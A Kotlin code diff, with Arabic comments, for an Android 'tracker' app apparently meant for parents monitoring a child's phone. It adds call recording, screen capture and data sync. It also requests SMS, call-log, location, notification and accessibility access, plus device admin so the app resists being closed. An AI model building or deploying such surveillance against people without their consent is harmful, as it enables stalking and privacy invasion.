@@ -1,4 +1,4 @@
-package com.abuzahra.child
+package com.abuzahra.tracker
 
 import android.Manifest
 import android.accessibilityservice.AccessibilityService
@@ -12,26 +12,29 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
-import android.widget.Button
+import android.text.TextUtils
+import android.webkit.WebSettings
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.abuzahra.child.databinding.ActivityMainBinding
-import com.abuzahra.child.receivers.MyDeviceAdminReceiver
-import com.abuzahra.child.services.MainTrackerService
-import com.google.firebase.auth.FirebaseAuth
+import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
+import com.abuzahra.tracker.services.CallRecorderService
+import com.abuzahra.tracker.services.DataSyncWorker
+import com.abuzahra.tracker.services.MainTrackerService
+import com.abuzahra.tracker.services.ScreenCaptureService
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var binding: ActivityMainBinding
-    private val PERMISSIONS_REQUEST_CODE = 1001
-    private lateinit var auth: FirebaseAuth
+    lateinit var webView: WebView
+    private val PERMISSIONS_REQUEST_CODE = 101
+    private var isSetupComplete = false
 
-    // قائمة الأذونات الخطرة التي تطلب وقت التشغيل
+    // قائمة الأذونات العادية (Runtime Permissions)
     private val runtimePermissions = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_SMS,
@@ -43,70 +46,85 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        binding = ActivityMainBinding.inflate(layoutInflater)
-        setContentView(binding.root)
-
-        auth = FirebaseAuth.getInstance()
+        setContentView(R.layout.activity_main)
+        webView = findViewById(R.id.webview)
         
-        // تسجيل دخول مجهول للربط
-        if (auth.currentUser == null) {
-            auth.signInAnonymously().addOnSuccessListener {
-                saveDeviceId()
-            }
-        }
+        // تحميل الواجهة
+        setupWebView()
 
-        binding.btnSetup.setOnClickListener {
-            if (checkAllPermissions()) {
-                startServices()
-                Toast.makeText(this, "تم تفعيل جميع الخدمات بنجاح", Toast.LENGTH_LONG).show()
-                binding.btnSetup.text = "النظام يعمل الآن"
-                binding.btnSetup.isEnabled = false
-            }
+        // بدء عملية طلب الأذونات
+        checkAndRequestPermissions()
+    }
+
+    private fun setupWebView() {
+        val webSettings: WebSettings = webView.settings
+        webSettings.javaScriptEnabled = true
+        webSettings.domStorageEnabled = true
+        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
+        webView.webViewClient = WebViewClient()
+        webView.loadUrl("file:///android_asset/child_index.html")
+    }
+
+    private fun checkAndRequestPermissions() {
+        // 1. طلب الأذونات العادية
+        val missingPermissions = runtimePermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
+
+        if (missingPermissions.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, missingPermissions, PERMISSIONS_REQUEST_CODE)
+        } else {
+            // إذا الأذونات العادية مفعلة، ننتقل للأذونات الخاصة
+            validateSpecialPermissions()
         }
     }
 
-    private fun checkAllPermissions(): Boolean {
-        // 1. التحقق من الأذونات العادية
-        val missingPermissions = runtimePermissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == PERMISSIONS_REQUEST_CODE) {
+            // نتأكد من الموافقة، ثم ننتقل للخاصة
+            validateSpecialPermissions()
         }
-        
-        if (missingPermissions.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSIONS_REQUEST_CODE)
-            return false
-        }
+    }
 
-        // 2. التحقق من Battery Optimization
+    private fun validateSpecialPermissions() {
+        // ترتيب الأولويات: البطارية -> النوافذ -> الاستخدام -> الإشعارات -> الوصول -> مسؤول الجهاز
+        
+        // 1. تجاهل تحسينات البطارية
         if (!isIgnoringBatteryOptimizations()) {
             requestIgnoreBatteryOptimizations()
-            return false
+            return // ننتظر العودة من الإعدادات
         }
 
-        // 3. التحقق من System Alert Window
+        // 2. العرض فوق التطبيقات
         if (!Settings.canDrawOverlays(this)) {
             startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-            return false
+            Toast.makeText(this, "مطلوب تفعيل 'Display over other apps'", Toast.LENGTH_LONG).show()
+            return
         }
 
-        // 4. التحقق من Usage Stats
+        // 3. Usage Stats
         if (!hasUsageStatsPermission()) {
             startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-            return false
+            Toast.makeText(this, "مطلوب تفعيل 'Apps with usage access'", Toast.LENGTH_LONG).show()
+            return
         }
 
-        // 5. التحقق من Notification Access
+        // 4. Notification Access
         if (!isNotificationServiceEnabled()) {
             startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-            return false
+            Toast.makeText(this, "مطلوب تفعيل 'Notification Access'", Toast.LENGTH_LONG).show()
+            return
         }
 
-        // 6. التحقق من Accessibility
+        // 5. Accessibility
         if (!isAccessibilityServiceEnabled()) {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            return false
+            Toast.makeText(this, "مطلوب تفعيل 'Accessibility Service'", Toast.LENGTH_LONG).show()
+            return
         }
 
-        // 7. التحقق من Device Admin
+        // 6. Device Admin
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val compName = ComponentName(this, MyDeviceAdminReceiver::class.java)
         if (!dpm.isAdminActive(compName)) {
@@ -114,20 +132,34 @@ class MainActivity : AppCompatActivity() {
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق من الإغلاق")
             startActivity(intent)
-            return false
+            return
         }
 
-        return true
+        // الكل تم تفعيله
+        onAllPermissionsGranted()
     }
 
-    private fun startServices() {
-        // بدء خدمة التتبع الرئيسية
-        val intent = Intent(this, MainTrackerService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+    private fun onAllPermissionsGranted() {
+        if (!isSetupComplete) {
+            isSetupComplete = true
+            startAllServices()
+            Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()
+            // استدعاء دالة جاهزة في WebView لإخبارها بالبدء
+            webView.post { webView.evaluateJavascript("window.onSetupComplete()", null) }
         }
+    }
+
+    private fun startAllServices() {
+        // 1. خدمة التتبع (الموقع، البطارية)
+        val trackerIntent = Intent(this, MainTrackerService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)
+
+        // 2. خدمة تسجيل المكالمات
+        val callIntent = Intent(this, CallRecorderService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)
+
+        // 3. مزامنة البيانات
+        DataSyncWorker.startImmediate(this)
     }
 
     // Helper Functions
@@ -153,24 +185,20 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun isNotificationServiceEnabled(): Boolean {
-        val packageName = packageName
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat != null && flat.contains(packageName)
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
         var accessibilityEnabled = 0
-        try {
-            accessibilityEnabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
-        } catch (e: Settings.SettingNotFoundException) { }
-
+        try { accessibilityEnabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED) } catch (e: Exception) {}
         if (accessibilityEnabled == 1) {
             val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
             if (settingValue != null) {
                 val splitter = TextUtils.SimpleStringSplitter(':')
                 splitter.setString(settingValue)
                 while (splitter.hasNext()) {
-                    if (splitter.next().equals("${packageName}/com.abuzahra.child.services.MyAccessibilityService", ignoreCase = true)) {
+                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                         return true
                     }
                 }
@@ -178,15 +206,6 @@ class MainActivity : AppCompatActivity() {
         }
         return false
     }
-
-    private fun saveDeviceId() {
-        // حفظ Device ID للمستخدم الحالي
-        val uid = auth.currentUser?.uid ?: return
-        // سنستخدم هذا الـ UID لربط البيانات
-        val sharedPref = getSharedPreferences("child_prefs", Context.MODE_PRIVATE) ?: return
-        with(sharedPref.edit()) {
-            putString("parent_id", uid) // في الواقع هذا يربط الطفل بولي الأمر
-            apply()
-        }
-    }
+    
+    fun startWorker() { DataSyncWorker.startImmediate(this) }
 }
